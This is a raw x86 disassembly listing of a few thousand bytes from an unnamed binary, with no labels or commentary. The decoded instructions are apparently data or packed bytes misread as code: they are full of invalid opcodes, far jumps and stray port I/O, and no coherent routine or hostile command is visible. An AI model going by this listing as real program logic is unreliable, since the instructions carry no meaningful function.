  424ec8:	imul   eax,DWORD PTR [ecx+eiz*4-0x27],0xe4e91614
  424ed0:	or     DWORD PTR [ebx-0xafa31b1],ebx
  424ed6:	sbb    bl,0xd1
  424ed9:	lods   eax,DWORD PTR ds:[esi]
  424eda:	out    0x71,al
  424edc:	push   0xde37ce29
  424ee1:	iret   
  424ee2:	mov    esp,0x769fead
  424ee7:	scas   al,BYTE PTR es:[edi]
  424ee8:	dec    esi
  424ee9:	iret   
  424eea:	addr16 and al,0xca
  424eed:	int3   
  424eee:	stos   BYTE PTR es:[edi],al
  424eef:	(bad)  
  424ef0:	fdiv   QWORD PTR gs:[ecx]
  424ef3:	push   ss
  424ef4:	(bad)  
  424ef5:	jmp    0x424f58
  424ef7:	add    DWORD PTR [edx],ebx
  424ef9:	add    DWORD PTR [edx+0x3fc2f300],edx
  424eff:	das    
  424f00:	rcl    DWORD PTR [edx+ebp*1+0x665b4fc7],1
  424f07:	imul   edi,DWORD PTR [esi+0x41],0x17
  424f0b:	adc    al,BYTE PTR [eax+0x340adc22]
  424f11:	inc    ebx
  424f12:	xor    eax,0x391f9ba6
  424f17:	sbb    bh,BYTE PTR [edi+0x5b]
  424f1a:	aad    0x9
  424f1c:	imul   eax,DWORD PTR [edi-0x4aa044e5],0x32
  424f23:	out    dx,eax
  424f24:	imul   DWORD PTR [eax]
  424f26:	sbb    eax,0xb37a2847
  424f2b:	jmp    0xa60f:0xa3d7e35f
  424f32:	scas   eax,DWORD PTR es:[edi]
  424f33:	jg     0x424f1e
  424f35:	jne    0x424f72
  424f37:	inc    esi
  424f38:	int3   
  424f39:	hlt    
  424f3a:	loop   0x424f7a
  424f3c:	push   cs
  424f3d:	test   al,0x27
  424f3f:	push   ecx
  424f40:	stc    
  424f41:	push   edx
  424f42:	add    DWORD PTR [ebp-0x11869128],ecx
  424f48:	outs   dx,BYTE PTR ds:[esi]
  424f49:	(bad)  
  424f4b:	jmp    0xb4b9e468
  424f50:	inc    ebx
  424f51:	mov    BYTE PTR [eax-0x78640e9],cl
  424f57:	hlt    
  424f58:	lock pop eax
  424f5a:	shr    BYTE PTR [edx-0x4f242099],0x91
  424f61:	cmp    eax,0xd47e8bc
  424f66:	test   BYTE PTR [ebp+0x364d2e8e],0x3c
  424f6d:	fidiv  DWORD PTR [edi-0x7cdc570b]
  424f73:	ins    DWORD PTR es:[edi],dx
  424f74:	pop    eax
  424f75:	inc    edx
  424f76:	loop   0x424fef
  424f78:	inc    ecx
  424f79:	mov    ebx,0x6f649fa
  424f7e:	stos   DWORD PTR es:[edi],eax
  424f7f:	(bad)  
  424f80:	aas    
  424f81:	dec    ebx
  424f82:	sbb    dl,BYTE PTR [eax]
  424f84:	mov    edi,0xedbaccf9
  424f89:	ss repnz mov bh,0x4c
  424f8d:	pop    ss
  424f8e:	jno    0x424ffe
  424f90:	ja     0x424ff1
  424f92:	xchg   edi,eax
  424f93:	mov    ebx,0x9c188136
  424f98:	scas   eax,DWORD PTR es:[edi]
  424f99:	adc    BYTE PTR [ecx+0x7d65c002],dl
  424f9f:	mov    ds:0x101053f2,al
  424fa4:	inc    ebx
  424fa5:	push   ss
  424fa6:	int    0x52
  424fa8:	adc    DWORD PTR [esi-0xe8c4601],eax
  424fae:	adc    ch,BYTE PTR [ebp+0x3e]
  424fb1:	pop    ds
  424fb2:	cli    
  424fb3:	or     ebp,0x33
  424fb6:	dec    esi
  424fb7:	mov    ds:0x689229f1,al
  424fbc:	push   ds
  424fbd:	push   0xffffff81
  424fbf:	adc    dl,BYTE PTR [edx+0x5a6eaf27]
  424fc5:	retf   0x71e2
  424fc8:	mov    bl,dl
  424fca:	cmc    
  424fcb:	shl    BYTE PTR [eax-0x24ccc4f5],cl
  424fd1:	xchg   ecx,eax
  424fd2:	pop    esp
  424fd3:	sub    edi,eax
  424fd5:	push   ebp
  424fd6:	jnp    0x42501e
  424fd8:	push   ss
  424fd9:	stos   DWORD PTR es:[edi],eax
  424fda:	mov    ebp,0xb98eb365
  424fdf:	aam    0xa5
  424fe1:	push   DWORD PTR [edi]
  424fe3:	(bad)  
  424fe5:	jle    0x425007
  424fe7:	out    dx,al
  424fe8:	test   BYTE PTR [edi-0x5da0c0e8],ah
  424fee:	jg     0x425061
  424ff0:	pop    es
  424ff1:	pop    edx
  424ff2:	or     DWORD PTR [ebx+0x338c3e10],0xffffff9f
  424ff9:	mov    ecx,DWORD PTR [edx-0x5]
  424ffc:	mov    eax,ds:0x234a75ed
  425001:	and    DWORD PTR [ecx],esi
  425003:	mov    edi,0x5d447b99
  425008:	arpl   sp,dx
  42500a:	fstp   DWORD PTR [edi+ebx*2]
  42500d:	sbb    DWORD PTR [edi],esp
  42500f:	inc    esp
  425010:	loop   0x42500e
  425012:	(bad)  
  425013:	cli    
  425014:	inc    esp
  425015:	sbb    BYTE PTR [edx+0x0],bl
  425018:	call   0xdac5:0x7b0ce8ae
  42501f:	pop    edx
  425020:	dec    BYTE PTR [edi-0x5e]
  425023:	inc    edx
  425024:	aad    0x2e
  425026:	xchg   BYTE PTR [ebp-0x7b],ch
  425029:	loope  0x424fbc
  42502b:	jg     0x424fec
  42502d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42502e:	push   esi
  42502f:	push   ds
  425030:	adc    eax,0xdf609b9
  425035:	push   edx
  425036:	popw   ss
  425038:	inc    esi
  425039:	ins    BYTE PTR es:[edi],dx
  42503a:	aad    0xfc
  42503c:	sub    al,0x47
  42503e:	fsub   DWORD PTR [esp+eax*2-0x77]
  425042:	jns    0x425019
  425044:	jno    0x425091
  425046:	xchg   esi,eax
  425047:	out    dx,eax
  425048:	cmp    DWORD PTR [edi],ebx
  42504a:	test   DWORD PTR [esi+0x13],0x2841c2e3
  425051:	pcmpeqb mm3,QWORD PTR ds:0xc28b5a24
  425058:	pop    ds
  425059:	xchg   DWORD PTR [edi+0x1cc0b570],edi
  42505f:	ror    DWORD PTR [ecx+0x562b9995],cl
  425065:	aas    
  425066:	push   0x9cd95a2f
  42506b:	sbb    al,0x91
  42506d:	ficom  WORD PTR [esi+0x184c6255]
  425073:	jp     0x4250b2
  425075:	test   BYTE PTR [ebx+0x947889c],ch
  42507b:	pop    eax
  42507c:	lods   eax,DWORD PTR ds:[esi]
  42507d:	mov    DWORD PTR [ecx+0x3fd963f7],edi
  425083:	repz iret 
  425085:	dec    ebp
  425086:	adc    ebp,esi
  425088:	dec    ebx
  425089:	or     bh,BYTE PTR [ebp+ebx*8+0x4c2e0dbe]
  425090:	mov    bl,0x1b
  425092:	test   eax,0x9e97f05c
  425097:	and    BYTE PTR [ecx],bl
  425099:	jp     0x4250d8
  42509b:	inc    eax
  42509c:	stos   BYTE PTR es:[edi],al
  42509d:	call   0x49ff3391
  4250a2:	inc    ebx
  4250a3:	and    ebx,DWORD PTR [ebp+0x11]
  4250a6:	mov    al,ds:0x717a5abb
  4250ab:	ds icebp 
  4250ad:	xor    ch,al
  4250af:	inc    edi
  4250b0:	(bad)  
  4250b1:	mov    dh,0xd
  4250b3:	push   0xa47f8794
  4250b8:	test   DWORD PTR [edi-0x2ba6a451],ebp
  4250be:	jg     0x425103
  4250c0:	cmp    eax,0xc3a919a
  4250c5:	cmc    
  4250c6:	jo     0x4250ef
  4250c8:	int3   
  4250c9:	jbe    0x4250ee
  4250cb:	leave  
  4250cc:	xchg   ebx,eax
  4250cd:	push   es
  4250ce:	xchg   ebx,eax
  4250cf:	call   0x2b1c:0xbc32ed65
  4250d6:	iret   
  4250d7:	scas   eax,DWORD PTR es:[edi]
  4250d8:	out    0x43,eax
  4250da:	or     DWORD PTR [eax+0x73dbce79],0xffffffc6
  4250e1:	test   eax,0xa1fff8b4
  4250e6:	(bad)  
  4250e7:	xor    ch,BYTE PTR [ebp-0x18b9ed19]
  4250ed:	inc    esi
  4250ee:	cld    
  4250ef:	mov    bl,0x21
  4250f1:	or     eax,0xf54a809a
  4250f6:	lock dec edx
  4250f8:	test   eax,0xb2e0909
  4250fd:	xor    eax,0xd9b4bf63
  425102:	imul   ecx,DWORD PTR [edx-0x6f],0x1f27fd97
  425109:	jg     0x42510c
  42510b:	push   ds
  42510c:	shl    BYTE PTR [ebp-0x2bc20f11],0x4d
  425113:	add    eax,0x25b61eda
  425118:	pop    ds
  425119:	xcrypt-cbc (bad)
  42511a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42511b:	aad    0x36
  42511d:	pop    edi
  42511e:	cmp    al,0x1e
  425120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425121:	mov    ah,0x1f
  425123:	push   esp
  425124:	mov    eax,ds:0xc3558371
  425129:	mov    eax,DWORD PTR [edx]
  42512b:	lods   eax,DWORD PTR ds:[esi]
  42512c:	push   ebp
  42512d:	les    ebx,FWORD PTR [ebx+0x4b]
  425130:	fcmovnbe st,st(0)
  425132:	fs sub eax,0x5d6e1ba8
  425138:	retf   
  425139:	jge    0x425146
  42513b:	sub    BYTE PTR [eax],cl
  42513d:	jae    0x425129
  42513f:	jmp    0xe5a6:0x59ae4784
  425146:	sub    BYTE PTR [edi+0x29],cl
  425149:	jp     0x425117
  42514b:	js     0x425102
  42514d:	inc    edx
  42514e:	inc    eax
  42514f:	and    al,0xc8
  425151:	loope  0x425109
  425153:	ficomp DWORD PTR [edi+0x24]
  425156:	call   0xa9595327
  42515b:	push   ecx
  42515c:	xor    ah,BYTE PTR [edi+0x499d2aab]
  425162:	dec    ecx
  425163:	mov    edi,0xf480d7be
  425168:	jl     0x42513a
  42516a:	int3   
  42516b:	add    eax,ecx
  42516d:	pop    es
  42516e:	push   0xffffffd8
  425170:	call   0x3327:0x1c43b103
  425177:	mov    eax,esi
  425179:	gs das 
  42517b:	icebp  
  42517c:	leave  
  42517d:	mov    edi,0xd6435242
  425182:	in     eax,0xd7
  425184:	cmp    DWORD PTR [ebx-0x76],edi
  425187:	sbb    DWORD PTR ds:0xb05922cd,0x143acc32
  425191:	in     eax,dx
  425192:	mov    edi,0x23998771
  425197:	outs   dx,BYTE PTR ds:[esi]
	...
  4251a0:	add    BYTE PTR [ecx-0x42],ch
  4251a3:	cmp    esi,DWORD PTR [esi-0x124801]
  4251a9:	jnp    0x4251f5
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	jns    0x4251b9
  4251af:	jmp    0x425183
  4251b1:	xchg   cl,cl
  4251b3:	add    DWORD PTR [eax],eax
  4251b5:	scas   eax,DWORD PTR es:[edi]
  4251b6:	add    eax,DWORD PTR [eax]
  4251b8:	add    BYTE PTR [ebp-0x57],ah
  4251bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251bc:	lods   eax,DWORD PTR ds:[esi]
  4251bd:	mov    BYTE PTR [ebx-0x2a],ch
  4251c0:	imul   esi,ebp,0xd3bb01de
  4251c6:	or     ch,BYTE PTR [ebx+0x1f]
  4251c9:	mov    al,ds:0xcee34727
  4251ce:	jne    0x425223
  4251d0:	push   ebx
  4251d1:	repnz int 0x9e
  4251d4:	lods   al,BYTE PTR ds:[esi]
  4251d5:	ja     0x42515c
  4251d7:	adc    al,0x34
  4251d9:	xchg   ebp,eax
  4251da:	jbe    0x4251bc
  4251dc:	push   0x6e
  4251de:	pop    DWORD PTR [esi]
  4251e0:	imul   edi,DWORD PTR [esi-0x7],0x10
  4251e4:	dec    edx
  4251e5:	ror    BYTE PTR [esi-0x44485639],cl
  4251eb:	push   cs
  4251ec:	shl    DWORD PTR [eax+0x35bb30da],0x8
  4251f3:	sub    DWORD PTR [ecx],0xd1ea1be8
  4251f9:	mov    ds:0x21f23d72,al
  4251fe:	xor    DWORD PTR [edx-0x1f6c027a],ebp
  425204:	jae    0x42525e
  425206:	mov    esi,0xd1a14b0d
  42520b:	adc    BYTE PTR [ebx+0x4e],dl
  42520e:	test   DWORD PTR [esi],ebx
  425210:	xchg   BYTE PTR ds:0x509eaaca,dh
  425216:	xor    DWORD PTR [ebx-0x45],esp
  425219:	imul   esi,DWORD PTR ds:0xadacae5d,0x29
  425220:	daa    
  425221:	fadd   DWORD PTR ss:[ebp-0x34]
  425225:	cli    
  425226:	mov    edx,0x910a67b0
  42522b:	push   ebx
  42522c:	icebp  
  42522d:	jb     0x4252a7
  42522f:	jg     0x425266
  425231:	jmp    FWORD PTR [ecx]
  425233:	or     BYTE PTR [edx],bl
  425235:	pop    edx
  425236:	push   ds
  425237:	xor    DWORD PTR [eax+0x55],edi
  42523a:	push   ebp
  42523b:	mov    ebx,0x8f7983e5
  425240:	sbb    BYTE PTR [ebx],cl
  425242:	or     eax,0x2b6166b3
  425247:	test   bl,bh
  425249:	in     al,0x48
  42524b:	fs or  dh,bh
  42524e:	sub    BYTE PTR [edi-0x6d],dh
  425251:	or     dl,ch
  425253:	mov    dh,0x24
  425255:	fwait
  425256:	sahf   
  425257:	pop    ebx
  425258:	cwde   
  425259:	cmp    DWORD PTR [edx],edi
  42525b:	pop    ecx
  42525c:	lahf   
  42525d:	out    0xda,al
  42525f:	xor    eax,0x2072bd99
  425264:	mov    DWORD PTR [esi],edx
  425266:	rcr    bh,cl
  425268:	or     al,dh
  42526a:	ds dec edi
  42526c:	mov    eax,0x44080a96
  425271:	std    
  425272:	lahf   
  425273:	add    al,0x30
  425275:	add    al,0xab
  425277:	popf   
  425278:	jmp    esp
  42527a:	xchg   ecx,eax
  42527b:	jg     0x425259
  42527d:	cmc    
  42527e:	cmpxchg DWORD PTR [ebx+0x194095ca],ebx
  425285:	or     dl,bh
  425287:	inc    ebx
  425288:	or     DWORD PTR cs:[edx-0x68],esi
  42528c:	div    BYTE PTR [edi]
  42528e:	ins    DWORD PTR es:[edi],dx
  42528f:	lock enter 0x99fd,0xfb
  425294:	sbb    cl,bh
  425296:	in     al,0x4b
  425298:	inc    eax
  425299:	cwde   
  42529a:	lea    edi,[edi+0x3232cf5d]
  4252a0:	mov    dh,0x12
  4252a2:	pop    ebp
  4252a3:	ficomp DWORD PTR [esi-0x7b512763]
  4252a9:	inc    esp
  4252aa:	ja     0x425286
  4252ac:	dec    esi
  4252ad:	lods   eax,DWORD PTR ds:[esi]
  4252ae:	mov    ebx,0xd8188d17
  4252b3:	jmp    0xaaed:0x77097ba3
  4252ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252bb:	sbb    al,0xe8
  4252bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252be:	lock arpl WORD PTR [ebx-0x23537bcb],sp
  4252c5:	mov    ebx,0x7c694828
  4252ca:	(bad)  
  4252cc:	cmp    al,0x6f
  4252ce:	out    0x59,al
  4252d0:	mov    ch,BYTE PTR [esi]
  4252d2:	loop   0x42534e
  4252d4:	jne    0x425264
  4252d6:	or     cl,bl
  4252d8:	iret   
  4252d9:	push   0x89a21b02
  4252de:	push   eax
  4252df:	push   esp
  4252e0:	jle    0x425295
  4252e2:	shl    DWORD PTR [ebx+0x2a],0xa7
  4252e6:	lea    esp,[edi+0x1b9173be]
  4252ec:	ins    BYTE PTR es:[edi],dx
  4252ed:	dec    edi
  4252ee:	xchg   ecx,eax
  4252ef:	pop    edx
  4252f0:	in     al,dx
  4252f1:	nop
  4252f2:	cmp    ebp,edi
  4252f4:	mov    bh,0x87
  4252f6:	jp     0x4252b3
  4252f8:	outs   dx,DWORD PTR ds:[esi]
  4252f9:	inc    DWORD PTR [ebp-0x4a]
  4252fc:	pop    es
  4252fd:	xchg   esp,eax
  4252ff:	cmp    al,0xbd
  425301:	inc    ebx
  425302:	adc    al,0x8c
  425304:	test   dl,ch
  425306:	adc    bh,BYTE PTR [eax+0x7ff3b156]
  42530c:	pushf  
  42530d:	xor    bl,BYTE PTR [edx]
  42530f:	(bad)  
  425310:	rol    BYTE PTR [eax+0x4897daef],1
  425316:	cmp    BYTE PTR [ecx+0x7b],cl
  425319:	xor    eax,esp
  42531b:	test   eax,0xbaae41cd
  425320:	mov    edx,0x41edcf09
  425325:	sbb    eax,0x927ff515
  42532a:	(bad)  [esp+eiz*4]
  42532d:	inc    eax
  42532e:	imul   esp,esi,0x626c58ab
  425334:	cmp    al,0x57
  425336:	sbb    al,0x20
  425338:	repnz mov eax,0xaba9090e
  42533e:	lea    esi,[esi]
  425340:	dec    edx
  425341:	jno    0x425360
  425343:	and    eax,0x3b3285ce
  425348:	loop   0x4253c2
  42534a:	cwde   
  42534b:	cld    
  42534c:	mov    eax,ds:0xf016ee87
  425351:	popa   
  425352:	enter  0x3a5,0x1f
  425356:	and    al,0x68
  425358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425359:	dec    esp
  42535a:	shr    BYTE PTR [edx],0x2a
  42535d:	add    ecx,ebx
  42535f:	sub    al,0xff
  425361:	mov    al,ds:0x19e1b177
  425366:	lods   al,BYTE PTR ds:[esi]
  425367:	dec    ebx
  425368:	lahf   
  425369:	mov    edi,ebx
  42536b:	out    0x3b,eax
  42536d:	das    
  42536e:	sub    DWORD PTR [esi-0x3f],ecx
  425371:	inc    esi
  425372:	repz fcom QWORD PTR [ecx+0x5e1ff4e]
  425379:	pop    ebp
  42537a:	sbb    DWORD PTR [ecx+eiz*2],0x6d21c92f
  425381:	loope  0x42535c
  425383:	jp     0x42534b
  425385:	dec    eax
  425386:	aaa    
  425387:	iret   
  425388:	or     DWORD PTR [edi-0x73cc2fe7],ecx
  42538e:	pop    ds
  42538f:	jb     0x4253df
  425391:	fbld   TBYTE PTR [ebp+0x503f12f5]
  425397:	(bad)  [esi-0x35d7c98b]
  42539d:	ret    0x9720
  4253a0:	ins    DWORD PTR es:[edi],dx
  4253a1:	or     DWORD PTR [edi-0x24],esp
  4253a4:	mov    eax,ds
  4253a6:	adc    edi,esi
  4253a8:	sbb    BYTE PTR ds:0x3b43fd42,al
  4253ae:	dec    ebp
  4253af:	pop    edi
  4253b0:	push   ecx
  4253b1:	ror    ecx,1
  4253b3:	mov    ch,0x8
  4253b5:	sti    
  4253b6:	xor    eax,0x2eceda80
  4253bb:	ja     0x4253c5
  4253bd:	jp     0x4253d8
  4253bf:	or     ch,al
  4253c1:	ja     0x4253f1
  4253c3:	push   edx
  4253c4:	test   BYTE PTR [esp+eiz*4],0xbf
  4253c8:	cmc    
  4253c9:	loope  0x4253e2
  4253cb:	mov    bh,0xf2
  4253cd:	jae    0x425437
  4253cf:	stc    
  4253d0:	jl     0x425352
  4253d2:	xchg   ebx,eax
  4253d3:	sti    
  4253d4:	das    
  4253d5:	ret    
  4253d6:	sub    eax,0x21621f88
  4253db:	ins    DWORD PTR es:[edi],dx
  4253dc:	mov    ss,edx
  4253de:	push   ss
  4253df:	lods   al,BYTE PTR ds:[esi]
  4253e0:	sub    DWORD PTR [ecx+ebx*2-0x4cae26ea],edx
  4253e7:	aas    
  4253e8:	cli    
  4253e9:	cmp    edx,edi
  4253eb:	(bad)  
  4253ec:	ds xor bl,bh
  4253ef:	cmp    ebx,edx
  4253f1:	ss add eax,0x318ee7c6
  4253f7:	fiadd  DWORD PTR [edi]
  4253f9:	cwde   
  4253fa:	jp     0x42546c
  4253fc:	arpl   WORD PTR [edx+0x6d7a51f7],di
  425402:	stos   BYTE PTR es:[edi],al
  425403:	arpl   cx,di
  425405:	aam    0xd2
  425407:	push   cs
  425408:	pop    es
  425409:	in     eax,0x65
  42540b:	imul   ebx,ebp,0x63d3167a
  425411:	cwde   
  425412:	ins    DWORD PTR es:[edi],dx
  425413:	mov    al,ah
  425415:	mov    WORD PTR [ebx+ebx*1+0x78],gs
  425419:	lock cld 
  42541b:	add    eax,0xb959b616
  425420:	jb     0x42549a
  425422:	sub    eax,0x735a8d8
  425427:	sub    edi,ebx
  425429:	out    dx,al
  42542a:	rcr    ah,0xf3
  42542d:	retf   
  42542e:	or     edi,esi
  425430:	fsubr  DWORD PTR [ecx]
  425432:	aaa    
  425433:	in     eax,0x57
  425435:	add    eax,0x990ef951
  42543a:	xchg   ecx,eax
  42543b:	xor    DWORD PTR [esi],esp
  42543d:	jmp    0xcad7:0x33faaf10
  425444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425445:	mov    ecx,0xc253e980
  42544a:	mov    ds:0x6162dcd1,eax
  42544f:	or     eax,0x1b126f24
  425454:	fs mov esp,db5
  425458:	scas   eax,DWORD PTR es:[edi]
  425459:	fucomi st,st(0)
  42545b:	xor    BYTE PTR [esi-0x472da547],0xa1
  425462:	cmp    al,0x64
  425464:	adc    BYTE PTR [esi+0x19],0xba
  425468:	out    dx,eax
  425469:	test   BYTE PTR ds:0x49cbccab,ah
  42546f:	pushw  0x5af7
  425473:	retf   
  425474:	mov    cl,0x6e
  425476:	leave  
  425477:	enter  0xa50b,0xd7
  42547b:	xor    ecx,ecx
  42547d:	aam    0xdb
  42547f:	and    ebx,DWORD PTR [esi+0x2783dea3]
  425485:	addr16 and ebp,ecx
  425488:	mov    ah,0xd7
  42548a:	jp     0x425466
  42548c:	lods   al,BYTE PTR ds:[esi]
  42548d:	inc    edi
  42548e:	out    0x67,al
  425490:	add    BYTE PTR [esi-0x2d71504b],cl
  425496:	sbb    eax,0xf2ca0841
  42549b:	pop    ss
  42549c:	mov    ecx,0x23664145
  4254a1:	int    0xbf
  4254a3:	push   cs
  4254a4:	lock pop edx
  4254a6:	jecxz  0x42546a
  4254a8:	adc    al,0xd4
  4254aa:	mov    edi,0xc3575654
  4254af:	ret    0x52c5
  4254b2:	daa    
  4254b3:	pop    eax
  4254b4:	adc    al,0x25
  4254b6:	aas    
  4254b7:	jb     0x425447
  4254b9:	mov    BYTE PTR [ecx],dh
  4254bb:	sub    bh,dh
  4254bd:	(bad)  
  4254bf:	inc    edx
  4254c0:	adc    dl,BYTE PTR [ecx+0xf]
  4254c3:	or     edi,DWORD PTR [esi-0x58]
  4254c6:	push   ebx
  4254c7:	jno    0x425453
  4254c9:	pop    edx
  4254ca:	test   BYTE PTR [ebx],cl
  4254cc:	fcmovbe st,st(4)
  4254ce:	xlat   BYTE PTR ds:[ebx]
  4254cf:	imul   esi,ebp,0x5d
  4254d2:	scas   al,BYTE PTR es:[edi]
  4254d3:	lds    edi,FWORD PTR [eax-0x2ed5d7ea]
  4254d9:	jl     0x42550c
  4254db:	jmp    0xd7bdc116
  4254e0:	int3   
  4254e1:	test   BYTE PTR [ebp+0x7926472f],dl
  4254e7:	pop    ebp
  4254e8:	sbb    DWORD PTR [esi+0x7a],ebp
  4254eb:	les    ebx,FWORD PTR [eax]
  4254ed:	ret    0x7287
  4254f0:	out    dx,eax
  4254f1:	into   
  4254f2:	enter  0x6b62,0xf5
  4254f6:	repnz loop 0x42550a
  4254f9:	aad    0x31
  4254fb:	xchg   BYTE PTR [edx-0x11],bh
  4254fe:	imul   BYTE PTR [edi-0x33]
  425501:	push   edi
  425502:	fidiv  DWORD PTR [edi]
  425504:	inc    ebp
  425505:	jne    0x425555
  425507:	aas    
  425508:	xor    al,BYTE PTR [ebp-0x106fd40d]
  42550e:	outs   dx,BYTE PTR ds:[esi]
  42550f:	adc    edx,edi
  425511:	sbb    DWORD PTR [eax+eiz*1],eax
  425514:	push   ds
  425515:	mov    WORD PTR [ecx],?
  425517:	popf   
  425518:	leave  
  425519:	outs   dx,DWORD PTR ds:[esi]
  42551a:	stos   DWORD PTR es:[edi],eax
  42551b:	inc    edx
  42551c:	sbb    eax,0xc7bd3e80
  425521:	es neg edx
  425524:	mov    ebp,0x849a640a
  425529:	dec    ebx
  42552a:	xchg   DWORD PTR [eax+0x1406a028],edi
  425530:	(bad)  
  425531:	std    
  425532:	cs std 
  425534:	shr    DWORD PTR [edi],1
  425536:	sbb    cl,BYTE PTR [eax+0x7942786e]
  42553c:	ds ret 
  42553e:	dec    ebx
  42553f:	pop    edx
  425540:	sub    al,ch
  425542:	sub    ebp,DWORD PTR ds:0x3a095c8c
  425548:	in     eax,0x4a
  42554a:	arpl   WORD PTR [edi],di
  42554c:	jne    0x4255bb
  42554e:	mov    bh,0x77
  425550:	imul   eax,DWORD PTR [edx+0x34f09b8a],0xd19cc1d7
  42555a:	fidivr DWORD PTR [ecx-0x57]
  42555d:	fsub   st(6),st
  42555f:	and    al,0x74
  425561:	ss leave 
  425563:	retf   0xcaef
  425566:	pop    esp
  425567:	jns    0x425569
	...
  425571:	jmp    0x4255bb
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     edi,eax
  42557e:	xor    al,0x1b
  425580:	and    al,0x35
  425582:	int    0x1
  425584:	add    BYTE PTR [edi-0x32fffffd],ch
  42558a:	nop
  42558b:	cmp    eax,0xa7261ae2
  425590:	cmp    BYTE PTR [ebx+0x7ee1391],bl
  425596:	loop   0x4255ee
  425598:	xor    edx,DWORD PTR [edx-0xe]
  42559b:	in     eax,dx
  42559c:	pop    eax
  42559d:	retf   
  42559e:	es popf 
  4255a0:	into   
  4255a1:	inc    edx
  4255a2:	mov    bh,BYTE PTR [ebx-0x711a07e9]
  4255a8:	lods   al,BYTE PTR ds:[esi]
  4255a9:	dec    esi
  4255aa:	data16 and al,0x7d
  4255ad:	xchg   ecx,eax
  4255ae:	inc    edi
  4255af:	push   0x7c
  4255b1:	lods   eax,DWORD PTR ds:[esi]
  4255b2:	jmp    0xf474:0xaf559c46
  4255b9:	or     bh,dl
  4255bb:	mov    al,BYTE PTR [eax*2+0x7a539f4c]
  4255c2:	out    dx,eax
  4255c3:	inc    edi
  4255c4:	rcl    ah,cl
  4255c6:	data16 jge 0x425585
  4255c9:	sbb    eax,0x31ec5f25
  4255ce:	push   edx
  4255cf:	sti    
  4255d0:	mov    ds:0xbbe6dcde,al
  4255d5:	add    ah,BYTE PTR [edx]
  4255d7:	daa    
  4255d8:	and    al,0xda
  4255da:	dec    eax
  4255db:	cmp    bh,bl
  4255dd:	push   0xffffffc9
  4255df:	sbb    al,0x98
  4255e1:	repz mov dl,ah
  4255e4:	lods   eax,DWORD PTR ds:[esi]
  4255e5:	jbe    0x425648
  4255e7:	mov    al,0x3b
  4255e9:	pop    eax
  4255ea:	es addr16 inc edx
  4255ed:	mov    esi,0xa2bf0a7d
  4255f2:	test   eax,0x5e12cbd
  4255f7:	dec    edx
  4255f8:	jge    0x425589
  4255fa:	xchg   edx,eax
  4255fb:	xor    BYTE PTR [esi],dl
  4255fd:	jge    0x42562a
  4255ff:	xor    eax,0x2063a138
  425604:	push   0xffffffb2
  425606:	fistp  DWORD PTR [ecx]
  425608:	add    ah,BYTE PTR [edx+0x46]
  42560b:	cld    
  42560c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42560d:	cdq    
  42560e:	jo     0x42566d
  425610:	dec    ebx
  425611:	mov    edx,edx
  425613:	jbe    0x4255c5
  425615:	xlat   BYTE PTR ds:[ebx]
  425616:	rcl    BYTE PTR [edi],cl
  425618:	jo     0x425655
  42561a:	div    ah
  42561c:	test   eax,0x1d70f02b
  425621:	dec    DWORD PTR [ebp-0x365e0c5c]
  425627:	aam    0x7d
  425629:	(bad)  
  42562a:	mov    ah,0x34
  42562c:	popa   
  42562d:	aaa    
  42562e:	fcom   DWORD PTR [edx-0x2d]
  425631:	sub    ch,dl
  425633:	pop    eax
  425634:	or     al,BYTE PTR [edx-0x2e7ee346]
  42563a:	inc    ebp
  42563b:	xchg   esi,eax
  42563c:	scas   eax,DWORD PTR es:[edi]
  42563d:	push   0xd00f882b
  425642:	jmp    0x425613
  425644:	(bad)  
  425646:	out    dx,al
  425647:	mov    eax,ds:0xcad432c4
  42564c:	inc    ebp
  42564d:	cmp    eax,0xa6f7419b
  425652:	in     eax,dx
  425653:	jecxz  0x425671
  425655:	or     al,bl
  425657:	push   cs
  425658:	inc    esi
  425659:	pushf  
  42565a:	fst    DWORD PTR [eax-0x60e51176]
  425660:	adc    DWORD PTR [ecx+ecx*2-0x4d4f460b],0xffffffed
  425668:	pop    esp
  425669:	in     eax,dx
  42566a:	jo     0x42562c
  42566c:	push   ebx
  42566d:	xchg   edi,eax
  42566e:	xchg   ebx,esi
  425670:	lods   eax,DWORD PTR ds:[esi]
  425671:	stos   DWORD PTR es:[edi],eax
  425672:	jo     0x425635
  425674:	les    esi,FWORD PTR [eax+0x50d22165]
  42567a:	jne    0x4256d1
  42567c:	xchg   DWORD PTR [ebx],esi
  42567e:	xchg   esp,eax
  42567f:	mov    esp,0x12a05c89
  425684:	out    0xcd,eax
  425686:	mov    eax,ds:0x6730b788
  42568b:	xor    cl,BYTE PTR [ebp+0x18]
  42568e:	loope  0x425620
  425690:	or     DWORD PTR [ebx],edx
  425692:	sbb    bl,BYTE PTR [esi+0x5]
  425695:	ds pop edi
  425697:	sbb    esp,DWORD PTR [ebp+0x55f8c98b]
  42569d:	jecxz  0x4256f7
  42569f:	push   esp
  4256a0:	cmp    eax,0x2170005f
  4256a5:	mov    esp,0x32196d24
  4256aa:	jmp    0x65d9:0xa52d76e3
  4256b1:	out    dx,al
  4256b2:	outs   dx,BYTE PTR ds:[si]
  4256b4:	rol    DWORD PTR [edi],cl
  4256b6:	xchg   ebp,eax
  4256b7:	sahf   
  4256b8:	cmp    al,0x92
  4256ba:	mov    ah,0xf7
  4256bc:	jnp    0x42564e
  4256be:	les    esp,FWORD PTR [eax]
  4256c0:	add    al,0xb2
  4256c2:	gs icebp 
  4256c4:	mov    ecx,0x315f72b4
  4256c9:	adc    ebx,ebp
  4256cb:	(bad)  
  4256cc:	lods   eax,DWORD PTR ds:[esi]
  4256cd:	imul   ebx,DWORD PTR [ecx+0x70],0x13bbea7c
  4256d4:	push   ebp
  4256d5:	mov    ah,dh
  4256d7:	xor    bl,ah
  4256d9:	inc    ebp
  4256da:	int    0x66
